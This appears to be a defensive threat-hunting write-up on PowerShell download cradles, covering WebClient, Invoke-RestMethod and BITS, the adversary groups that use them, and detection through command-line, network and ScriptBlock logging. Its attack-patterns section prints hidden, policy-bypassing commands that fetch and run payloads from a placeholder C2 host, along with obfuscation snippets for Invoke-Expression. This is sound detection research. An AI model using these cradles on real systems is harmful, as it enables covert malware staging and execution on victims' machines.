## 1. System Research: How It Works

### Summary
PowerShell is an extensible automation engine and scripting environment native to Microsoft Windows. Because it possesses deep access to the underlying .NET Common Language Runtime (CLR), scripts and interactive commands can instantiate arbitrary .NET classes to interact directly with network protocols, device memory, and operating system APIs without relying on disk-resident executable binaries.

### Core Download & Execution Mechanisms
Adversaries construct single-line commands known as "download cradles" to stage or execute payloads:
- **`System.Net.WebClient`:** The classic .NET web client class exposes methods such as `.DownloadString()` (fetches content directly into a string buffer in process memory), `.DownloadData()` (retrieves raw bytes), and `.DownloadFile()` (writes payload to a specified disk path).
- **Cmdlet Web Transfers (`Invoke-WebRequest`, `Invoke-RestMethod`):** Native cmdlets (`iwr`, `irm`) introduced in PowerShell v3+ that communicate over HTTP/HTTPS, often piped directly into execution interpreters.
- **`Start-BitsTransfer`:** Leverages the Background Intelligent Transfer Service (BITS) to conduct file staging under the guise of legitimate Windows update mechanics.
- **In-Memory Expression Evaluation (`IEX` / `Invoke-Expression`):** Built-in command evaluator that executes arbitrary string content as live PowerShell code within the host process memory space, avoiding disk writes.

## 2. Adversary Tradecraft: Attack Techniques

### Summary
Adversaries across commodity loaders (Emotet, Qakbot, IcedID, SocGholish) and targeted intrusions (FIN7, APT29) utilize download cradles as a primary mechanism for Ingress Tool Transfer (`T1105`) and in-memory execution (`T1059.001`).

### Common Attack Patterns
1. **Classic WebClient In-Memory Cradle:**
   ```powershell
   powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://<c2-host>/payload.ps1')"
   ```
2. **Piped RestMethod Cradle:**
   ```powershell
   powershell.exe -w hidden -c "irm http://<c2-host>/beacon.ps1 | iex"
   ```
3. **DownloadFile Staging:**
   ```powershell
   powershell.exe -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('http://<c2-host>/loader.exe', '%TEMP%\loader.exe'); Start-Process '%TEMP%\loader.exe'"
   ```
4. **Obfuscation Variants (T1027):**
   - Environment variable slicing (`$env:ComSpec[4,15,25]-Join''`).
   - Format string token insertion (`&("{0}{1}"-f'I','EX')`).
   - Base64 encoding via command line flags (`-enc`, `-EncodedCommand`).

## 5. Research Synthesis

### Executive Summary
PowerShell web download cradles remain one of the most persistent living-off-the-land techniques for initial staging and remote payload execution. Effective detection requires a layered defense combining process command line inspection (catching known cradle syntax and flags like `-NonI -W Hidden`), network egress monitoring (flagging `powershell.exe` initiating outbound HTTP/HTTPS sessions), and PowerShell ScriptBlock Logging (Event ID 4104) to expose de-obfuscated script content before execution.

### Recommended Hypothesis
> Adversaries execute PowerShell command lines containing web download methods (Net.WebClient.DownloadString, Invoke-WebRequest, Invoke-RestMethod) combined with Invoke-Expression to download and execute secondary payloads directly in memory on Windows endpoints.
